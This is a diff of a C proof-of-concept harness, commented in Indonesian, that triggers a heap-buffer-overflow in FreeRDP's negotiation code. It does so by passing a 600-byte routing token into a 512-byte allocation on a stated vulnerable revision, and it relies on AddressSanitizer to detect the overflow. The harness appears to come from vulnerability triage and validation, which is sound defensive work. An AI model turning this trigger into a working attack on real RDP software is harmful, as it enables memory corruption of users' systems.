@@ -1,14 +1,17 @@
 /*
  * harness_nego.c — PoC dinamis untuk klaster "nego->RoutingTokenLength" (hasil sift/triage).
  *
- * Yang dicoba dibuktikan (jalur redirection, GHSA-2vf2-grvj-6g8x):
- *   nego_set_routing_token(nego, token, len)      → nego->RoutingTokenLength = len
- *   nego_send_negotiation_request(nego, …)        → alokasi 512 B, lalu Stream_Write(…, RoutingTokenLength)
- *   ⇒ dengan token > 512 B, penulisan melewati batas alokasi → ASan: heap-buffer-overflow
+ * Membuktikan jalur yang ditemukan analisis statis pada revisi RENTAN — commit artikel Quarkslab
+ * 993499447. Di master sekarang sudah ditambal (ada Stream_EnsureRemainingCapacity); di commit itu
+ * TIDAK ada, jadi:
  *
- * Dipakai di CI (.github/workflows/vulnres.yml). Build dengan -fsanitize=address.
- * Bila API internal berbeda antar versi, harness mencoba beberapa jalur dan melaporkan
- * mana yang tercapai (artefak: log ASan + stdout).
+ *   nego_set_routing_token(nego, token, len)  → nego->RoutingTokenLength = len (data penyerang)
+ *   nego_send_negotiation_request(nego)       → Stream_New(nullptr, 512) lalu
+ *                                               Stream_Write(s, token, len)   ← tanpa cek kapasitas
+ *   ⇒ token > 512 B (plus 12 B TPDU) → penulisan melewati alokasi → ASan: heap-buffer-overflow
+ *
+ * Catatan API: nego_new() menerima rdpTransport*, dan nego.h/transport.h hidup di libfreerdp/core
+ * (header internal, tak diinstal) → build butuh -I ke pohon sumber + link statis.
  */
 #include <stdio.h>
 #include <string.h>
@@ -16,58 +19,71 @@
 
 #include <freerdp/freerdp.h>
 #include <freerdp/settings.h>
-#include <freerdp/nego.h>
 #include <winpr/wlog.h>
 
-#define TOKEN_LEN 600 /* > 512 (alokasi di nego_send_negotiation_request) */
+#include "transport.h" /* libfreerdp/core/transport.h */
+#include "nego.h"      /* libfreerdp/core/nego.h */
+
+#define TOKEN_LEN 600 /* > 512 (alokasi Stream_New di nego_send_negotiation_request) */
 
 int main(void)
 {
-	WLog* log = WLog_GetRoot();
-	WLog_SetLogLevel(log, WLOG_WARN);
+	WLog_SetLogLevel(WLog_GetRoot(), WLOG_WARN);
 
-	const size_t len = TOKEN_LEN;
-	unsigned char* token = (unsigned char*)malloc(len);
+	unsigned char* token = (unsigned char*)malloc(TOKEN_LEN);
 	if (!token)
 		return 3;
-	memset(token, 'A', len);
-	/* header cookie agar menyerupai token routing nyata (Cookie: mstshash=..\r\n) */
-	memcpy(token, "Cookie: mstshash=poc\r\n", 22);
+	memset(token, 'A', TOKEN_LEN);
+	memcpy(token, "Cookie: mstshash=poc\r\n", 22); /* menyerupai token routing nyata */
 
-	rdpSettings* settings = freerdp_settings_new(0);
-	if (!settings)
+	freerdp* instance = freerdp_new();
+	if (!instance)
 	{
-		fprintf(stderr, "[harness] gagal freerdp_settings_new\n");
+		fprintf(stderr, "[harness] freerdp_new gagal\n");
 		return 3;
 	}
-	if (!freerdp_settings_set_bool(settings, FreeRDP_RdpSecurity, TRUE))
-		fprintf(stderr, "[harness] peringatan: set RdpSecurity gagal\n");
+	instance->ContextSize = sizeof(rdpContext);
+	if (!freerdp_context_new(instance))
+	{
+		fprintf(stderr, "[harness] freerdp_context_new gagal\n");
+		return 3;
+	}
+	rdpContext* context = instance->context;
+	if (!context)
+	{
+		fprintf(stderr, "[harness] context kosong\n");
+		return 3;
+	}
+	fprintf(stdout, "[harness] instance+context siap (settings=%p)\n", (void*)context->settings);
+	fflush(stdout);
 
-	rdpNego* nego = nego_new(settings);
+	rdpTransport* transport = transport_new(context);
+	if (!transport)
+	{
+		fprintf(stderr, "[harness] transport_new gagal\n");
+		return 3;
+	}
+
+	rdpNego* nego = nego_new(transport);
 	if (!nego)
 	{
-		fprintf(stderr, "[harness] gagal nego_new\n");
+		fprintf(stderr, "[harness] nego_new gagal\n");
 		return 3;
 	}
 
-	fprintf(stdout, "[harness] menyuntikkan routing token %zu byte\n", len);
-	if (!nego_set_routing_token(nego, token, (UINT32)len))
+	fprintf(stdout, "[harness] menyuntikkan routing token %d byte (batas alokasi 512)\n", TOKEN_LEN);
+	fflush(stdout);
+	if (!nego_set_routing_token(nego, token, (UINT32)TOKEN_LEN))
 	{
 		fprintf(stderr, "[harness] nego_set_routing_token gagal\n");
 		return 2;
 	}
-	fprintf(stdout, "[harness] RoutingTokenLength tersimpan; memanggil jalur pengiriman\n");
+	fprintf(stdout, "[harness] RoutingTokenLength tersimpan; memanggil nego_send_negotiation_request\n");
 	fflush(stdout);
 
-	/* jalur rentan (nego.c: alokasi 512 B lalu Stream_Write sepanjang RoutingTokenLength) */
-	const BOOL ok = nego_send_negotiation_request(nego);
+	(void)nego_send_negotiation_request(nego); /* ← overflow terjadi di sini (revisi rentan) */
 
-	fprintf(stdout, "[harness] nego_send_negotiation_request = %s\n", ok ? "TRUE" : "FALSE");
-	fprintf(stdout, "[harness] SELESAI tanpa crash — jalur sink tidak tercapai (perlu transport/setup lain)\n");
+	fprintf(stdout, "[harness] selesai TANPA crash — jalur sink tidak tercapai (cek revisi/API)\n");
 	fflush(stdout);
-
-	nego_free(nego);
-	freerdp_settings_free(settings);
-	free(token);
 	return 0;
 }
